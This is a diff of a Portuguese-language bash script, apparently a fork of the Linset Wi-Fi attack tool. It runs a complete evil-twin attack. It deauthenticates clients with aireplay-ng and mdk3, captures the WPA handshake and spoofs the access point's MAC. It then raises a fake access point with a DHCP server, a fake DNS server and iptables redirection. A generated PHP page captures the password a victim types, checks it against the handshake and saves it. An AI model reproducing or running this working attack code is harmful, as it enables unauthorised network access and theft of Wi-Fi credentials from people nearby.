+	echo -e "Aperte ${amarelo}ENTER$rescolor para confirmar"
+	echo
+	echo -n "caminho: "
+	echo -ne "$vermelho"
+	read handshakeloc
+	echo -ne "$rescolor"
+	
+		if [ "$handshakeloc" = "" ]; then
+			deauthforce
+		else
+			if [ -f "$handshakeloc" ]; then
+				Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
+				Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
+				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
+					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
+						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
+						webinterface
+					else
+					echo "Handshake incompleto."
+					echo
+					sleep 4
+					echo "Você pode tentar a sua sorte com aircrack-ng..."
+					echo "Você quer testar com aircrack-ng em vez de pyrit para verificar o HANDSHAKE? [ ENTER = NAO ]"
+					echo
+					echo -n "Resposta: "
+					echo -ne "$vermelho"
+					read handshakeloc_aircrack
+					echo -ne "$rescolor"
+					if [ "$handshakeloc_aircrack" = "" ]; then
+						handshakelocation
+					else
+						if aircrack-ng $handshakeloc | grep -q "1 handshake"; then
+							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
+							webinterface
+						else
+							echo "O handshake esta corrompido"
+							sleep 4
+							handshakelocation
+						fi
+					fi
+					fi
+				else
+					echo -e "${vermelho}Error$rescolor!"
+					echo
+					echo -e "File ${vermelho}MAC$rescolor"
+					
+					readarray -t lista_loc < <(pyrit -r $handshakeloc analyze 2>&1 | grep "^#")
+						for i in "${lista_loc[@]}"; do
+							echo -e "$verde$(echo $i | cut -d " " -f1) $amarelo$(echo $i | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')$rescolor ($verde$(echo $i | cut -d "(" -f2 | cut -d "'" -f2)$rescolor)"
+						done
+					
+					echo -e "Host ${verde}MAC$rescolor"
+					echo -e "$verde#1: $amarelo$Host_MAC$rescolor ($verde$Host_SSID$rescolor)"
+					sleep 7
+					handshakelocation
+				fi
+			else
+				echo -e "Archivo ${vermelho}NO$rescolor existe"
+				sleep 4
+				handshakelocation
+			fi
+		fi
+}
+
+function deauthforce {
+	
+	conditional_clear
+	
+	mostrarheader
+	while true; do
+		
+		echo "TIPO DE VERIFICAÇÃO DO HANDSHAKE"
+		echo "                                       "
+		echo -e "      "$verde"1)"$rescolor" ◈ aircrack-ng"
+		echo -e "      "$verde"2)"$rescolor" ◈ pyrit"
+		echo -e "      "$verde"3)"$rescolor" ◈ Voltar"
+		echo "                                       "
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) handshakemode="normal"; askclientsel; break ;;
+			2 ) handshakemode="hard"; askclientsel; break ;;
+			3 ) askauth; break ;;
+			* ) echo "Opção desconhecida. Escolha novamente"; conditional_clear ;;
+		esac
+	done 
+}
+
+############################################### < MENU > ###############################################
+
+
+
+
+
+
+############################################# < HANDSHAKE > ############################################
+
+# Tipo de Deauth que será executado
+function askclientsel {
+	
+	conditional_clear
+	
+	while true; do
+		mostrarheader
+		
+		echo "CAPTURAR HANDSHAKE"
+		echo "                                       "
+		echo -e "      "$verde"1)"$rescolor" Desautenticaçao Massiva de AP"
+		echo -e "      "$verde"2)"$rescolor" Desautenticaçao Massiva AP (MDK3)"
+		echo -e "      "$verde"3)"$rescolor" Desautenticaçao Especifica de AP"
+		echo -e "      "$verde"4)"$rescolor" Voltar a Escanear"
+		echo -e "      "$verde"5)"$rescolor" Sair"
+		echo "                                       "
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) deauth all; break ;;
+			2 ) deauth mdk3; break ;;
+			3 ) deauth esp; break ;;
+			4 ) killall airodump-ng &>$linset_output_device; vk496; break;;    
+			5 ) exitmode; break ;;
+			* ) echo "Opção desconhecida. Escolha novamente"; conditional_clear ;;
+		esac
+	done 
+	
+}
+
+# 
+function deauth {
+	
+	conditional_clear
+	
+	iwconfig $WIFI_MONITOR channel $Host_CHAN
+	
+	case $1 in
+		all )
+			DEAUTH=deauthall
+			capture & $DEAUTH
+			CSVDB=$Host_MAC-01.csv
+		;;
+		mdk3 )
+			DEAUTH=deauthmdk3
+			capture & $DEAUTH &
+			CSVDB=$Host_MAC-01.csv
+		;;
+		esp )
+			DEAUTH=deauthesp
+			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
+			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
+			
+			if [ $LINEAS_CLIENTES -le 5 ]; then
+				DEAUTH=deauthall
+				capture & $DEAUTH
+				CSVDB=$Host_MAC-01.csv
+				deauth
+				
+			fi
+			
+			capture
+			for CLIENT in $HOST; do
+				Client_MAC=`echo ${CLIENT:0:17}`	
+				deauthesp
+			done
+			$DEAUTH
+			CSVDB=$Host_MAC-01.csv
+		;;
+	esac
+	
+	
+	deauthMENU
+	
+}
+
+function deauthMENU {
+	
+	Handshake_statuscheck="${gris}Sin handshake$rescolor"
+	
+	while true; do
+		conditional_clear
+		mostrarheader
+		
+		echo "HANDSHAKE capturado?"
+		echo 
+		echo -e "Estado do handshake: $Handshake_statuscheck"
+		echo
+		echo -e "      "$verde"1)"$rescolor" Sim" 
+		echo -e "      "$verde"2)"$rescolor" Nao (Tentar de Novo)"
+		echo -e "      "$verde"3)"$rescolor" Nao (Selecionar outro Ataque)"  
+		echo -e "      "$verde"4)"$rescolor" Selecionar outra Rede"  
+		echo -e "      "$verde"5)"$rescolor" Sair"
+		echo " "
+		echo -n '      #> '
+		read yn
+		
+		case $yn in
+			1 ) checkhandshake;;
+			2 ) capture; $DEAUTH & ;;
+			3 ) conditional_clear; askclientsel; break;;
+			4 ) killall airodump-ng &>$linset_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
+			5 ) exitmode; break;;
+			* ) echo "Opção desconhecida. Escolha novamente"; conditional_clear ;;
+		esac
+		
+	done
+}
+
+# Captura todas as Redes
+function capture {
+	
+	conditional_clear
+	if ! ps -A | grep -q airodump-ng; then
+		
+		rm -rf $DUMP_PATH/$Host_MAC*
+		xterm $HOLD -title "Capturando dados no canal --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
+	fi
+}
+
+# Verifique o aperto de mão antes de continuar
+function checkhandshake {
+	
+	if [ "$handshakemode" = "normal" ]; then
+		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
+			killall airodump-ng &>$linset_output_device
+			webinterface
+			break
+		else
+			Handshake_statuscheck="${vermelho}Malo$rescolor"
+		fi
+	elif [ "$handshakemode" = "hard" ]; then
+		cp $DUMP_PATH/$Host_MAC-01.cap $DUMP_PATH/test.cap &>$linset_output_device
+		
+		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
+			killall airodump-ng &>$linset_output_device
+			webinterface
+			break
+		else
+			if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
+				Handshake_statuscheck="${amarelo}Corrupto$rescolor"
+			else
+				Handshake_statuscheck="${vermelho}Malo$rescolor"
+			fi
+		fi
+		
+		rm $DUMP_PATH/test.cap &>$linset_output_device
+	fi
+}
+
+############################################# < HANDSHAKE > ############################################
+
+
+
+
+
+
+############################################# < ATAQUE > ############################################
+
+# Selecione a interface da web a ser usada
+function webinterface {
+	
+	while true; do
+		conditional_clear
+		mostrarheader
+		
+		infoap
+		echo
+		echo "SELECIONE A INTERFACE DA WEB"
+		echo
+		
+		echo -e "$verde""1)"$rescolor" Interface web neutra"
+		echo -e "$verde""2)"$rescolor" \e[1;31mSair"$rescolor""
+		
+		echo
+		echo -n "#? "
+		read line
+		
+		if [ "$line" = "2" ]; then
+			exitmode
+		elif [ "$line" = "1" ]; then
+			conditional_clear
+			mostrarheader
+			
+			infoap
+			echo
+			echo "SELECIONAR IDIOMA"
+			echo
+			
+			echo -e "$verde""1)"$rescolor" Inglês     [ENG]"
+			echo -e "$verde""2)"$rescolor" Espanhol     [ESP]"
+			echo -e "$verde""3)"$rescolor" Itáliano       [IT]"
+			echo -e "$verde""4)"$rescolor" Francês      [FR]"
+			echo -e "$verde""5)"$rescolor" Portugues  [POR]"
+			echo -e "$verde""6)"$rescolor" \e[1;31mVoltar"$rescolor""
+			
+			echo
+			echo -n "#? "
+			read linea
+			language=${webinterfaceslenguage[$line]}
+			
+			if [ "$linea" = "1" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
+				NEUTRA
+				break
+			elif [ "$linea" = "2" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
+				NEUTRA
+				break
+			elif [ "$linea" = "3" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_IT
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_IT
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_IT
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_IT
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_IT
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_IT
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_IT
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_IT
+				NEUTRA
+				break
+			elif [ "$linea" = "4" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_FR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_FR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_FR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_FR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_FR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_FR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_FR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_FR
+				NEUTRA
+				break
+			elif [ "$linea" = "5" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_POR
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_POR
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_POR
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_POR
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_POR
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_POR
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_POR
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_POR
+				NEUTRA
+				break
+			elif [ "$linea" = "6" ]; then
+				continue
+			fi
+		fi
+	
+	done
+	preattack
+	attack
+}
+
+# Crie diferentes configurações necessárias para o script e os serviços preapa
+function preattack {
+	
+# Gera a configuração do hostapd
+echo "interface=$WIFI
+driver=nl80211
+ssid=$Host_SSID
+channel=$Host_CHAN
+">$DUMP_PATH/hostapd.conf
+
+# Crie o php que os ifaces usam
+echo "<?php
+error_reporting(0);
+
+\$count_my_page = (\"$DUMP_PATH/hit.txt\");
+\$hits = file(\$count_my_page);
+\$hits[0] ++;
+\$fp = fopen(\$count_my_page , \"w\");
+fputs(\$fp , \"\$hits[0]\");
+fclose(\$fp);
+
+// Receber o formulário Postar dados e salvá-lo em variáveis
+
+\$key1 = @\$_POST['key1'];
+
+// Escreva o nome do arquivo de texto onde a loja será
+\$filename = \"$DUMP_PATH/data.txt\";
+\$filename2 = \"$DUMP_PATH/status.txt\";
+\$intento = \"$DUMP_PATH/intento\";
+
+
+// Marge todas as variáveis ​​com texto em uma única variável. 
+\$f_data= ''.\$key1.'';
+
+
+if ( (strlen(\$key1) < 8) ) {
+echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MIN\\\");window.history.back()</script>\";
+break;
+}
+
+if ( (strlen(\$key1) > 63) ) {
+echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MAX\\\");window.history.back()</script>\";
+break;
+}
+
+
+\$file = fopen(\$filename, \"w\");
+fwrite(\$file,\"\$f_data\");
+fwrite(\$file,\"\n\");
+fclose(\$file);
+
+
+\$archivo = fopen(\$intento, \"w\");
+fwrite(\$archivo,\"\n\");
+fclose(\$archivo);
+
+while(1) 
+{
+
+if (file_get_contents(\"\$intento\") == 2) {
+	    header(\"location:final.html\");
+	    break;
+	} 
+if (file_get_contents(\"\$intento\") == 1) {
+	    header(\"location:error.html\");
+	    unlink(\$intento);
+	    break;
+	}
+	
+sleep(1);
+}
+
+?>" > $DUMP_PATH/data/check.php
+
+# A configuração do servidor DHCP é criada
+echo "authoritative;
+
+default-lease-time 600;
+max-lease-time 7200;
+
+subnet $RANG_IP.0 netmask 255.255.255.0 {
+
+option broadcast-address $RANG_IP.255;
+option routers $IP;
+option subnet-mask 255.255.255.0;
+option domain-name-servers $IP;
+
+range $RANG_IP.100 $RANG_IP.250;
+
+} 
+" >$DUMP_PATH/dhcpd.conf
+
+# A configuração do servidor da Web Lighttpd é criada
+echo "server.document-root = \"$DUMP_PATH/data/\"
+
+server.modules = (
+  \"mod_access\",
+  \"mod_alias\",
+  \"mod_accesslog\",
+  \"mod_fastcgi\",
+  \"mod_redirect\",
+  \"mod_rewrite\"
+) 
+
+fastcgi.server = ( \".php\" => ((
+		  \"bin-path\" => \"/usr/bin/php-cgi\",
+		  \"socket\" => \"/php.socket\"
+		)))
+
+server.port = 80
+server.pid-file = \"/var/run/lighttpd.pid\"
+# server.username = \"www\"
+# server.groupname = \"www\"
+
+mimetype.assign = (
+\".html\" => \"text/html\",
+\".htm\" => \"text/html\",
+\".txt\" => \"text/plain\",
+\".jpg\" => \"image/jpeg\",
+\".png\" => \"image/png\",
+\".css\" => \"text/css\"
+)
+
+
+server.error-handler-404 = \"/\"
+
+static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
+index-file.names = ( \"index.htm\" )
+
+#Redirect www.domain.com to domain.com
+\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
+url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+}
+
+" >$DUMP_PATH/lighttpd.conf
+
+# Script (não é meu) que redireciona todas as solicitações de DNS para o gateway (nosso PC)
+echo "import socket
+
+class DNSQuery:
+  def __init__(self, data):
+    self.data=data
+    self.dominio=''
+
+    tipo = (ord(data[2]) >> 3) & 15   # 4bits de tipo de consulta
+    if tipo == 0:                     # Standard query
+      ini=12
+      lon=ord(data[ini])
+      while lon != 0:
+	self.dominio+=data[ini+1:ini+lon+1]+'.'
+	ini+=lon+1
+	lon=ord(data[ini])
+
+  def respuesta(self, ip):
+    packet=''
+    if self.dominio:
+      packet+=self.data[:2] + \"\x81\x80\"
+      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'   # Número e respostas Preg
+      packet+=self.data[12:]                                         # Nome de domínio original
+      packet+='\xc0\x0c'                                             # Ponteiro para o nome de domínio
+      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'             # Tipo de resposta, ttl, etc
+      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.'))) # O ip no hex
+    return packet
+
+if __name__ == '__main__':
+  ip='$IP'
+  print 'pyminifakeDNS:: dom.query. 60 IN A %s' % ip
+
+  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  udps.bind(('',53))
+  
+  try:
+    while 1:
+      data, addr = udps.recvfrom(1024)
+      p=DNSQuery(data)
+      udps.sendto(p.respuesta(ip), addr)
+      print 'Respuesta: %s -> %s' % (p.dominio, ip)
+  except KeyboardInterrupt:
+    print 'Finalizando'
+    udps.close()
+" >$DUMP_PATH/fakedns
+chmod +x $DUMP_PATH/fakedns
+	
+}
+
+# Prepare as tabelas de roteamento para estabelecer um servidor DHCP / WEB
+function routear {
+	
+	ifconfig $interfaceroutear up
+	ifconfig $interfaceroutear $IP netmask 255.255.255.0
+	
+	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
+	echo "1" > /proc/sys/net/ipv4/ip_forward
+	
+	iptables --flush
+	iptables --table nat --flush
+	iptables --delete-chain
+	iptables --table nat --delete-chain
+	iptables -P FORWARD ACCEPT
+	
+	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
+	iptables -t nat -A POSTROUTING -j MASQUERADE
+}
+
+# Executa o ataque
+function attack {
+	
+	if [ "$fakeapmode" = "hostapd" ]; then
+		interfaceroutear=$WIFI
+	elif [ "$fakeapmode" = "airbase-ng" ]; then
+		interfaceroutear=at0
+	fi
+	
+	handshakecheck
+	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
+	
+	if [ "$fakeapmode" = "hostapd" ]; then
+		
+		ifconfig $WIFI down
+		sleep 0.4
+		macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $linset_output_device
+		sleep 0.4
+		ifconfig $WIFI up
+		sleep 0.4
+	fi
+	
+	
+	if [ $fakeapmode = "hostapd" ]; then
+		killall hostapd &> $linset_output_device
+		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
+		elif [ $fakeapmode = "airbase-ng" ]; then
+		killall airbase-ng &> $linset_output_device
+		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
+	fi
+	sleep 5
+	
+	routear &
+	sleep 3
+	
+	
+	killall dhcpd &> $linset_output_device
+	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
+	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $linset_output_device
+	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e python $DUMP_PATH/fakedns &
+	
+	killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $linset_output_device
+	lighttpd -f $DUMP_PATH/lighttpd.conf &> $linset_output_device
+	
+	killall aireplay-ng &> $linset_output_device
+	killall mdk3 &> $linset_output_device
+	echo "$(strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando con mdk3 a todos de $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	
+	xterm -hold $TOPRIGHT -title "Esperando a Senha" -e $DUMP_PATH/handcheck &
+	conditional_clear
+	
+	while true; do
+		mostrarheader
+		
+		echo "Ataque em progresso..."
+		echo "                                       "
+		echo "      1) Escolher outra Rede" 
+		echo "      2) Sair"
+		echo " "
+		echo -n '      #> '
+		read yn
+		case $yn in
+			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
+			2 ) matartodo; exitmode; break;;
+			* ) echo "Opção desconhecida. Escolha novamente"; conditional_clear ;;
+		esac
+	done
+	
+}
+
+# Verifique a validade da senha
+function handshakecheck {
+	
+	echo "#!/bin/bash
+	
+	echo > $DUMP_PATH/data.txt
+	echo -n \"0\"> $DUMP_PATH/hit.txt
+	echo "" >$DUMP_PATH/loggg
+	
+	tput civis
+	clear
+	
+	minutos=0
+	horas=0
+	i=0
+	timestamp=\$(date +%s)
+	
+	while true; do
+	
+	segundos=\$i
+	dias=\`expr \$segundos / 86400\`
+	segundos=\`expr \$segundos % 86400\`
+	horas=\`expr \$segundos / 3600\`
+	segundos=\`expr \$segundos % 3600\`
+	minutos=\`expr \$segundos / 60\`
+	segundos=\`expr \$segundos % 60\`
+	
+	if [ \"\$segundos\" -le 9 ]; then
+	is=\"0\"
+	else
+	is=
+	fi
+	
+	if [ \"\$minutos\" -le 9 ]; then
+	im=\"0\"
+	else
+	im=
+	fi
+	
+	if [ \"\$horas\" -le 9 ]; then
+	ih=\"0\"
+	else
+	ih=
+	fi">>$DUMP_PATH/handcheck
+
+	if [ $authmode = "handshake" ]; then
+		echo "if [ -f $DUMP_PATH/intento ]; then
+		
+		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Senha nao esta aqui\"; then
+		echo \"2\">$DUMP_PATH/intento
+		break
+		else
+		echo \"1\">$DUMP_PATH/intento
+		fi
+		
+		fi">>$DUMP_PATH/handcheck
+		
+	elif [ $authmode = "wpa_supplicant" ]; then
+		  echo "
+		wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
+		wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
+		
+		if [ -f $DUMP_PATH/intento ]; then
+		
+		if grep -i 'WPA: Negociação de Chave concluída' $DUMP_PATH/loggg; then
+		echo \"2\">$DUMP_PATH/intento
+		break
+		else
+		echo \"1\">$DUMP_PATH/intento
+		fi
+		
+		fi
+		">>$DUMP_PATH/handcheck
+	fi
+	
+	echo "readarray -t CLIENTESDHCP < <(nmap -sP -oG - $RANG_IP.100-110 2>&1 | grep Host )
+	
+	echo
+	echo -e \"  PONTO DE ACESSO:\"
+	echo -e \"    NOME..........: "$branco"$Host_SSID"$rescolor"\"
+	echo -e \"    MAC.............: "$amarelo"$Host_MAC"$rescolor"\"
+	echo -e \"    CANAL...........: "$branco"$Host_CHAN"$rescolor"\"
+	echo -e \"    FABRICANTE......: "$verde"$Host_MAC_MODEL"$rescolor"\"
+	echo -e \"    TEMPO ATIVO...: "$gris"\$ih\$horas:\$im\$minutos:\$is\$segundos"$rescolor"\"
+	echo -e \"    TENTATIVAS........: "$vermelho"\$(cat $DUMP_PATH/hit.txt)"$rescolor"\"
+	echo -e \"    CLIENTES........: "$azul"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | sort| uniq | wc -l)"$rescolor"\"
+	echo
+	echo -e \"  CLIENTES ATIVOS:\"
+	
+	x=0
+	for cliente in \"\${CLIENTESDHCP[@]}\"; do
+	  x=\$((\$x+1))
+	  CLIENTE_IP=\$(echo \$cliente| cut -d \" \" -f2)
+	  CLIENTE_MAC=\$(nmap -sP \$CLIENTE_IP 2>&1 | grep -i mac | cut -d \" \" -f3 | tr [:upper:] [:lower:])
+	  
+	  if [ \"\$(echo \$CLIENTE_MAC| wc -m)\" != \"18\" ]; then
+		CLIENTE_MAC=\"xx:xx:xx:xx:xx:xx\"
+	  fi
+	  
+	  CLIENTE_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$CLIENTE_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
+	  
+	  if echo \$CLIENTE_MAC| grep -q x; then
+		    CLIENTE_FABRICANTE=\"unknown\"
+	  fi
+	  
+	  CLIENTE_HOSTNAME=\$(echo \$cliente| cut -d \" \" -f 3 | cut -d \"(\" -f2 | cut -d \")\" -f1)
+	  
+	  echo -e \"    $verde\$x) $vermelho\$CLIENTE_IP $amarelo\$CLIENTE_MAC $rescolor($azul\$CLIENTE_FABRICANTE$rescolor) $verde\$CLIENTE_HOSTNAME$rescolor\"   
+	done
+	
+	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
+	
+	
+	if [ $authmode = "handshake" ]; then
+		echo "let i=\$(date +%s)-\$timestamp
+		sleep 1">>$DUMP_PATH/handcheck
+		
+	elif [ $authmode = "wpa_supplicant" ]; then
+		echo "sleep 5
+		
+		killall wpa_supplicant &>$linset_output_device
+		killall wpa_passphrase &>$linset_output_device
+		let i=\$i+5">>$DUMP_PATH/handcheck
+	fi
+	
+	echo "done
+	clear
+	echo \"1\" > $DUMP_PATH/status.txt
+	
+	sleep 7
+	
+	killall mdk3 &>$linset_output_device
+	killall aireplay-ng &>$linset_output_device
+	killall airbase-ng &>$linset_output_device
+	kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$linset_output_device
+	killall hostapd &>$linset_output_device
+	killall lighttpd &>$linset_output_device
+	killall dhcpd &>$linset_output_device
+	killall wpa_supplicant &>$linset_output_device
+	killall wpa_passphrase &>$linset_output_device
+	
+	echo \"
+	THC Wifi Tools $version by RavokTHC
+	
+	SSID: $Host_SSID
+	BSSID: $Host_MAC ($Host_MAC_MODEL)
+	Channel: $Host_CHAN
+	Security: $Host_ENC
+	Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
+	Password: \$(cat $DUMP_PATH/data.txt)
+	\" >$HOME/$Host_SSID-password.txt">>$DUMP_PATH/handcheck
+	
+	
+	if [ $authmode = "handshake" ]; then
+		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"Se ha guardado en "$vermelho"$HOME/$Host_SSID-password.txt"$rescolor"\" 
+		">>$DUMP_PATH/handcheck
+		
+	elif [ $authmode = "wpa_supplicant" ]; then
+		echo "echo -e \"Se ha guardado en "$vermelho"$HOME/$Host_SSID-password.txt"$rescolor"\"">>$DUMP_PATH/handcheck
+	fi
+	
+	echo "kill -INT \$(ps a | grep bash| grep linset | awk '{print \$1}') &>$linset_output_device">>$DUMP_PATH/handcheck
+	chmod +x $DUMP_PATH/handcheck
+}
+
+
+############################################# < ATAQUE > ############################################
+
+
+
+
+
+
+############################################## < COSAS > ############################################
+
+# Deauth a todos
+function deauthall {
+	
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautenticando todos de $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
+}
+
+function deauthmdk3 {
+	
+	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautenticando mdk3 a todos $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	mdk3PID=$!
+	sleep 15
+	kill $mdk3PID &>$linset_output_device
+}
+
+# Deauth para um cliente específico
+function deauthesp {
+	
+	sleep 2
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautenticando a $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
+}
+
+# Feche todos os processos
+function matartodo {
+	
+	killall aireplay-ng &>$linset_output_device
+	kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$linset_output_device
+	killall hostapd &>$linset_output_device
+	killall lighttpd &>$linset_output_device
+	killall dhcpd &>$linset_output_device
+	killall xterm &>$linset_output_device
+	
+}
+
+
+
+############################################## < COSAS > ############################################
+
+
+
+
+
+
+######################################### < INTERFACES WEB > ########################################
+
+# Crie o conteúdo da interface da web
+function NEUTRA {
+	
+	if [ ! -d $DUMP_PATH/data ]; then
+		mkdir $DUMP_PATH/data
+	fi
+	
+echo "UEsDBBQAAAAIAEZ8zkSJ9HAPjoIAAMRtAQATABwAanF1ZXJ5LTEuOC4zLm1pbi5qc1VUCQADVE+c
+U1RPnFN1eAsAAQQAAAAABAAAAACcfWl720aW7vf7K0RMRg2YRUrM0tMDCuZ4vXbfeOnYnaSHYvJA
+ZFGCDQEMFi0h+d/nvKcWFEDIyZ08joil1lOnzl4HJ48GR5/+Ucvi/uhmMv7b+JujT7/hbrzMr492
+5iYvLk/SZCmzUh49Ovk//rrOllWSZ74UVbA1d0e/+jLY3sTFURW9mctFtN1PC1nVRXZ0M5bx8sqX
+43KTJpV/HwiniSzYVvNsEQ1O94Go9ra5V3gnimCbrP0iiqLq+FiOs3wlP95vJN1PVGdJ5K3iKh55
